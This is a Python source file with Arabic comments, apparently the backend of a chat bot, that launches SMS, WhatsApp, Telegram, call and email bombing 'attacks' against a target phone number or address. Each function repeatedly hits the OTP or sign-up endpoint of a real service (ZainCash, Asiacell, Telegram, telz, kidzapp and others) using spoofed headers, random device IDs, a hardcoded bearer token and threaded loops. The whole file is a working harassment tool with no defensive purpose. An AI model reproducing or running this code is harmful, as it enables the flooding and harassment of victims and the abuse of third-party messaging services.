here#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import random
import uuid
import threading
from datetime import datetime

# ======================== الإعدادات الأساسية ========================
active_attacks = {}
active_attacks_lock = threading.Lock()

def generate_user_agent():
    """توليد وكيل مستخدم عشوائي"""
    user_agents = [
        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1'
    ]
    return random.choice(user_agents)

def generate_unique_ids():
    """توليد معرفات فريدة"""
    timestamp = int(time.time() * 1000)
    android_id = ''.join(random.choices('0123456789abcdef', k=16))
    device_uuid = str(uuid.uuid4())
    session_id = str(uuid.uuid4())
    random_suffix = random.randint(1000, 9999)
    return timestamp, android_id, device_uuid, session_id, random_suffix

# ======================== أدوات الهجوم ========================

def attack_asia_1(phone, count, chat_id, attack_id):
    """🔥 اسيا 1 - رسائل تاكيد اسياسيل"""
    url = "https://kycapi-np-prod.zaincash.iq/api/v2/auth/request-otp"
    success = 0
    fail = 0
    
    for i in range(count):
        if not active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
            break
        
        try:
            headers = {
                'User-Agent': generate_user_agent(),
                'Connection': "Keep-Alive",
                'Authorization': "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhY3Rvcl9pZCI6MjI1MH0.dzzHZvJmlGaSYy8abX1s9K5NWPQuvIKwzQ-yoYobHug",
                'x-lang': "ar",
                'x-device-uid': str(random.randint(1, 9999)),
                'x-platform': "android",
                'source': "app_sdk",
                'x-app': "mobi.foo.zaincash",
                'Content-Type': "application/x-www-form-urlencoded"
            }
            
            payload = {
                'client': "android",
                'language': "ar",
                'phone_number': phone,
                'source': "app_sdk",
                'osversion': str(random.randint(11, 14)),
                'lang': "ar"
            }
            
            response = requests.post(url, data=payload, headers=headers, timeout=10)
            
            if response.status_code == 200:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = success
            active_attacks[chat_id][attack_id]['bad'] = fail
            active_attacks[chat_id][attack_id]['current'] = i + 1
        
        time.sleep(3)
    
    if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
        active_attacks[chat_id][attack_id]['active'] = False
    
    return success, fail


def attack_asia_2(phone, count, chat_id, attack_id):
    """🆕 اسيا 2 - اسياسيل اسرع"""
    url = "https://odpapp.asiacell.com/api/v1/login?lang=ar"
    success = 0
    fail = 0
    
    for i in range(count):
        if not active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
            break
        
        try:
            device_id = str(uuid.uuid4())
            
            payload = {"captchaCode": "", "username": phone}
            
            headers = {
                'User-Agent': "okhttp/5.1.0",
                'Connection': "Keep-Alive",
                'Content-Type': "application/json",
                'DeviceID': device_id,
                'X-OS-Version': str(random.randint(11, 14)),
                'X-Device-Type': f"[Android][TECNO][TECNO LH7n 14][TIRAMISU][HMS][4.3.7:90000325]",
                'X-ODP-APP-VERSION': "4.3.7",
                'X-FROM-APP': "odp",
                'X-ODP-CHANNEL': "mobile"
            }
            
            response = requests.post(url, json=payload, headers=headers, timeout=10)
            
            if '"success":true' in response.text:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = success
            active_attacks[chat_id][attack_id]['bad'] = fail
            active_attacks[chat_id][attack_id]['current'] = i + 1
        
        time.sleep(2)
    
    if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
        active_attacks[chat_id][attack_id]['active'] = False
    
    return success, fail


def attack_asia_3(phone, count, speed, chat_id, attack_id):
    """💳 اسيا 3 - بطاقات وهمية"""
    url = "https://pashacards.net/wp-admin/admin-ajax.php"
    success = 0
    fail = 0
    delay = 1.0 / speed if speed > 0 else 0.1
    
    for i in range(count):
        if not active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
            break
        
        try:
            payload = {
                'action': "send_pin_code",
                'msisdn': phone,
                'appId': "3",
                'countryId': "2",
                'currency': "IQD",
                'tax': "0",
                'price': "21643",
                'cPPPId': "411",
                'packageName': "قسيمة شراء",
                'paymentMethodId': "3",
                'thirdPartyId': "Takarub",
                'email': "test@takarub.com"
            }
            
            headers = {
                'User-Agent': generate_user_agent(),
                'x-requested-with': "XMLHttpRequest",
                'origin': "https://pashacards.net",
                'referer': "https://pashacards.net/",
                'accept-language': "ar-EG,ar;q=0.9"
            }
            
            response = requests.post(url, data=payload, headers=headers, timeout=10)
            
            if response.status_code == 200:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = success
            active_attacks[chat_id][attack_id]['bad'] = fail
            active_attacks[chat_id][attack_id]['current'] = i + 1
        
        time.sleep(delay)
    
    if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
        active_attacks[chat_id][attack_id]['active'] = False
    
    return success, fail


def attack_whatsapp_1(phone, chat_id, attack_id):
    """📱 واتساب 1"""
    url = "https://gw.abgateway.com/student/whatsapp/signup"
    success = 0
    fail = 0
    
    while active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
        try:
            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'user-agent': generate_user_agent(),
                'origin': 'https://abwaab.com',
                'referer': 'https://abwaab.com/',
                'platform': 'web'
            }
            
            json_data = {
                'language': 'ar',
                'password': 'Aasf5ft',
                'country': '',
                'phone': phone,
                'platform': 'web',
                'data': {'Language': 'ar'},
                'channel': 'whatsapp'
            }
            
            response = requests.post(url, headers=headers, json=json_data, timeout=10)
            
            if response.status_code == 200:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = success
            active_attacks[chat_id][attack_id]['bad'] = fail
        
        time.sleep(2)
    
    return success, fail


def attack_whatsapp_2(phone, country_code, speed, chat_id, attack_id):
    """⚡ واتساب 2 - سرعة قابلة للتعديل"""
    url = "https://api.sloegem.com/send/verify/code"
    success = 0
    fail = 0
    delay = 1.0 / speed if speed > 0 else 0.1
    
    while active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
        try:
            payload = {
                "area": country_code,
                "businessCode": 1,
                "phone": phone,
                "sendType": 3,
                "type": 1
            }
            
            headers = {
                'User-Agent': generate_user_agent(),
                'Content-Type': "application/json",
                'device-id': str(uuid.uuid4())[:16],
                'app-id': "10000003",
                'app-version': "1.1.24"
            }
            
            response = requests.post(url, json=payload, headers=headers, timeout=10)
            
            if '"success":true' in response.text:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = success
            active_attacks[chat_id][attack_id]['bad'] = fail
        
        time.sleep(delay)
    
    return success, fail


def attack_telegram(phone, country_code, chat_id, attack_id):
    """📱 تليغرام عادي"""
    success = 0
    fail = 0
    
    while active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
        try:
            full_phone = f"{country_code}{phone}"
            
            headers = {
                'authority': 'oauth.telegram.org',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://oauth.telegram.org',
                'user-agent': generate_user_agent(),
                'x-requested-with': 'XMLHttpRequest'
            }
            
            params = {
                'bot_id': '531675494',
                'origin': 'https://telegram.org',
                'embed': '1',
                'request_access': 'write'
            }
            
            data = {'phone': full_phone}
            response = requests.post('https://oauth.telegram.org/auth/request', params=params, headers=headers, data=data, timeout=10)
            
            if response.status_code == 200 and 'true' in response.text:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = success
            active_attacks[chat_id][attack_id]['bad'] = fail
        
        time.sleep(1.5)
    
    return success, fail


def attack_telegram_new(phone, chat_id, attack_id):
    """📱 تليغرام جديد"""
    success = 0
    fail = 0
    
    while active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
        try:
            clean_phone = phone.replace('+', '').replace(' ', '')
            
            headers = {
                'authority': 'my.telegram.org',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://my.telegram.org',
                'user-agent': generate_user_agent(),
                'x-requested-with': 'XMLHttpRequest'
            }
            
            data = {'phone': clean_phone}
            response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data=data, timeout=10)
            
            if response.status_code == 200:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = success
            active_attacks[chat_id][attack_id]['bad'] = fail
        
        time.sleep(1)
    
    return success, fail


def attack_calls(phone, country_code, count, delay, chat_id, attack_id):
    """📞 سبام مكالمات"""
    url_install = "https://api.telz.com/app/install"
    url_auth = "https://api.telz.com/app/auth_call"
    success = 0
    fail = 0
    
    for i in range(count):
        if not active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
            break
        
        try:
            timestamp, android_id, device_uuid, session_id, random_suffix = generate_unique_ids()[:5]
            
            # طلب التثبيت
            payload_install = {
                "android_id": android_id,
                "app_version": random.choice(['17.5.19', '17.5.18']),
                "event": "install",
                "os": "android",
                "os_version": str(random.randint(9, 13)),
                "ts": timestamp,
                "uuid": str(device_uuid),
                "session_id": session_id
            }
            
            headers = {
                'User-Agent': generate_user_agent(),
                'Content-Type': "application/json",
                'X-Session-ID': session_id
            }
            
            install_resp = requests.post(url_install, json=payload_install, headers=headers, timeout=7)
            
            if install_resp.status_code == 200:
                # طلب المكالمة
                payload_call = {
                    "android_id": android_id,
                    "event": "auth_call",
                    "os": "android",
                    "phone": f"{country_code}{phone}",
                    "ts": timestamp + random.randint(100, 500),
                    "uuid": str(device_uuid),
                    "session_id": session_id,
                    "call_id": random_suffix
                }
                
                call_resp = requests.post(url_auth, json=payload_call, headers=headers, timeout=7)
                
                if call_resp.status_code == 200:
                    success += 1
                else:
                    fail += 1
            else:
                fail += 1
        except:
            fail += 1
        
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = success
            active_attacks[chat_id][attack_id]['bad'] = fail
            active_attacks[chat_id][attack_id]['current'] = i + 1
        
        time.sleep(delay)
    
    if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
        active_attacks[chat_id][attack_id]['active'] = False
    
    return success, fail


def attack_cash(phone, count, chat_id, attack_id):
    """💵 زين كاش"""
    url = "https://mw-mobileapp.iq.zain.com/api/otp/request"
    success = 0
    fail = 0
    
    for i in range(count):
        if not active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
            break
        
        try:
            payload = {"msisdn": phone}
            headers = {
                'User-Agent': "okhttp/4.11.0",
                'Connection': "Keep-Alive",
                'Skel-Accept-Language': "ar",
                'Skel-Platform': "Android",
                'Content-Type': "application/json; charset=UTF-8"
            }
            
            response = requests.post(url, json=payload, headers=headers, timeout=10)
            result = response.json()
            
            if result.get("status") == "success":
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = success
            active_attacks[chat_id][attack_id]['bad'] = fail
            active_attacks[chat_id][attack_id]['current'] = i + 1
        
        time.sleep(2)
    
    if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
        active_attacks[chat_id][attack_id]['active'] = False
    
    return success, fail


def attack_email(email, chat_id, attack_id):
    """📧 سبام ايميل"""
    url = "https://api.kidzapp.com/api/3.0/customlogin/"
    success = 0
    fail = 0
    
    while active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
        try:
            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'user-agent': generate_user_agent(),
                'origin': 'https://kidzapp.com'
            }
            
            json_data = {'email': email, 'sdk': 'web', 'platform': 'desktop'}
            response = requests.post(url, headers=headers, json=json_data, timeout=10)
            
            if response.status_code == 200 and 'EMAIL SENT' in response.text:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = success
            active_attacks[chat_id][attack_id]['bad'] = fail
        
        time.sleep(2)
    
    return success, fail


# ======================== بدء الهجمات ========================

def start_attack(chat_id, attack_id, tool, params):
    """بدء هجوم جديد"""
    with active_attacks_lock:
        if chat_id not in active_attacks:
            active_attacks[chat_id] = {}
        
        active_attacks[chat_id][attack_id] = {
            'active': True,
            'tool': tool,
            'params': params,
            'good': 0,
            'bad': 0,
            'current': 0,
            'total': params.get('count', 0)
        }
    
    # تشغيل الهجوم في thread منفصل
    thread = threading.Thread(
        target=run_attack_thread,
        args=(chat_id, attack_id, tool, params)
    )
    thread.daemon = True
    thread.start()
    
    return True


def run_attack_thread(chat_id, attack_id, tool, params):
    """تشغيل الهجوم في thread"""
    if tool == 'asia_1':
        attack_asia_1(params['phone'], params['count'], chat_id, attack_id)
    elif tool == 'asia_2':
        attack_asia_2(params['phone'], params['count'], chat_id, attack_id)
    elif tool == 'asia_3':
        attack_asia_3(params['phone'], params['count'], params['speed'], chat_id, attack_id)
    elif tool == 'whatsapp_1':
        attack_whatsapp_1(params['phone'], chat_id, attack_id)
    elif tool == 'whatsapp_2':
        attack_whatsapp_2(params['phone'], params['country_code'], params['speed'], chat_id, attack_id)
    elif tool == 'telegram':
        attack_telegram(params['phone'], params['country_code'], chat_id, attack_id)
    elif tool == 'telegram_new':
        attack_telegram_new(params['phone'], chat_id, attack_id)
    elif tool == 'calls':
        attack_calls(params['phone'], params['country_code'], params['count'], params['delay'], chat_id, attack_id)
    elif tool == 'cash':
        attack_cash(params['phone'], params['count'], chat_id, attack_id)
    elif tool == 'email':
        attack_email(params['email'], chat_id, attack_id)


def stop_attack(chat_id, attack_id):
    """إيقاف هجوم"""
    with active_attacks_lock:
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['active'] = False
            return True
    return False


def stop_all_attacks(chat_id):
    """إيقاف كل هجمات المستخدم"""
    with active_attacks_lock:
        if chat_id in active_attacks:
            for attack_id in active_attacks[chat_id]:
                active_attacks[chat_id][attack_id]['active'] = False
            return True
    return False


def get_attacks(chat_id):
    """الحصول على قائمة الهجمات"""
    with active_attacks_lock:
        if chat_id in active_attacks:
            return {
                str(k): {
                    'active': v['active'],
                    'tool': v['tool'],
                    'good': v['good'],
                    'bad': v['bad'],
                    'current': v['current'],
                    'total': v['total']
                }
                for k, v in active_attacks[chat_id].items()
            }
        return {}
